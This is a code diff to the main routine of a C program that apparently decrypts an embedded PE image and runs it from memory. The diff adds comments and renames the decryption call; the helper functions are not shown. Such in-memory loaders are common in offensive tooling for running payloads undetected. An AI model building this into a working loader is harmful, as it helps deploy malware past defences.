@@ -15,6 +15,7 @@
 NTCONF g_NtConfig = { 0 };
 SC_FUNC g_Fun = { 0 };
 
+CONTENT temp = { 0 };
 
 
 int main()
@@ -29,51 +30,60 @@ int main()
 		return 1;
 	}
 
-
+	//Get the PE data
 	if (!GetPE(&cnt)) {
 		DEBUG_PRINT("[!] Failed getting the PE\n");
 		return 1;
 	}
 
-	if (!Decrypt(&cnt)) {
+	//Decrypt the data
+	if (!Crypt(&cnt)) {
 		DEBUG_PRINT("[!] PE Decryption failed\n");
 		return 1;
 	}
 
+	//Parse the PE headers
 	if (!InitPE(&PeHdrs, cnt)) {
 		DEBUG_PRINT("[!] Failed parsing PE headers\n");
 		return 1;
 	}
 
+	cnt.data = NULL;
+	cnt.size = NULL;
 
+	//Allocation memory and copy the PE sections
 	pPeBase = PreparePE(&PeHdrs);
 	if (pPeBase == NULL) {
 		DEBUG_PRINT("[!] Something failed\n");
 		return 1;
 	}
 
+	//Apply relocations
 	if (!ApplyRelocations(PeHdrs.pRelocDir, pPeBase, PeHdrs.pNtHeaders->OptionalHeader.ImageBase)) {
 		DEBUG_PRINT("[!] Failed applying relocations\n");
 		return 1;
 	}
 
+	//Fix the import table
 	if (!FixImports(PeHdrs.pImportDir, pPeBase)) {
 		DEBUG_PRINT("[!] Failed fixing the Import Table\n");
 		return 1;
 	}
 
+	//Fix the section memory permissions
 	if (!FixMem(pPeBase, PeHdrs.pNtHeaders, PeHdrs.pSectHeader)) {
 		DEBUG_PRINT("[!] Failed fixing memory permissions\n");
 		return 1;
 	}
 
+	//Fix the PE's arguments
 	PrepareArgs((LPSTR)PE_ARGS);
 
+	//Execute the PE's entrypoint
 	if (!Execute(pPeBase, &PeHdrs, NULL)) {
 		DEBUG_PRINT("[!] Execution failed\n");
 		return 1;
 	}
-
 
     return 0;
 }
